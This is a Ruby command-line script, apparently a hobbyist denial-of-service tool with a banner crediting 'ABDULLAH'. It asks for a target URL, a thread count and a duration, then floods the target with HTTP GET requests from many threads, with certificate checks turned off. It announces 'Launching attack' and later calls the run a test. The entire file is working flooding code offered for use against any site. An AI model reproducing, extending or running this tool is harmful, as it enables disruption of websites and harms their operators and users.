#!/usr/bin/env ruby
require 'net/http'
require 'uri'
require 'thread'
require 'timeout'
require 'openssl'

# -- Banner Function --
def show_banner
  system("clear") || system("cls")
  puts "\e[1;31m"
  puts "   █████╗ ██████╗ ██████╗ ██╗   ██╗██╗     ██╗      █████╗ ██╗  ██╗"
  puts "  ██╔══██╗██╔══██╗██╔══██╗██║   ██║██║     ██║     ██╔══██╗╚██╗██╔╝"
  puts "  ███████║██████╔╝██████╔╝██║   ██║██║     ██║     ███████║ ╚███╔╝ "
  puts "  ██╔══██║██╔═══╝ ██╔═══╝ ██║   ██║██║     ██║     ██╔══██║ ██╔██╗ "
  puts "  ██║  ██║██║     ██║     ╚██████╔╝███████╗███████╗██║  ██║██╔╝ ██╗"
  puts "  ╚═╝  ╚═╝╚═╝     ╚═╝      ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝"
  puts "\e[0m"
  puts "\e[1;32m                 Made by ABDULLAH | GitHub: @yourname\e[0m\n\n"
end

# -- Main Tool Function --
def protected_run
  show_banner

  print "Enter target URL (e.g., https://example.com): "
  target = gets.chomp
  print "Enter number of threads to use: "
  thread_count = gets.chomp.to_i
  print "Enter duration in seconds: "
  duration = gets.chomp.to_i

  uri = URI.parse(target)
  mutex = Mutex.new
  end_time = Time.now + duration

  puts "\nLaunching attack for #{duration} seconds with #{thread_count} threads...\n\n"

  threads = []

  thread_count.times do
    threads << Thread.new do
      while Time.now < end_time
        begin
          http = Net::HTTP.new(uri.host, uri.port)
          http.use_ssl = uri.scheme == 'https'
          http.verify_mode = OpenSSL::SSL::VERIFY_NONE
          request = Net::HTTP::Get.new(uri.request_uri)
          response = http.request(request)

          mutex.synchronize do
            puts "[+] Sent GET to #{uri.host} - Status: #{response.code}"
          end
        rescue => e
          mutex.synchronize do
            puts "[!] Error: #{e.message}"
          end
        end
      end
    end
  end

  threads.each(&:join)
  puts "\n[+] Test complete."
end

begin
  protected_run
rescue Interrupt
  puts "\n[-] Test interrupted by user."
rescue => e
  puts "[!] Critical Error: #{e.message}"
end
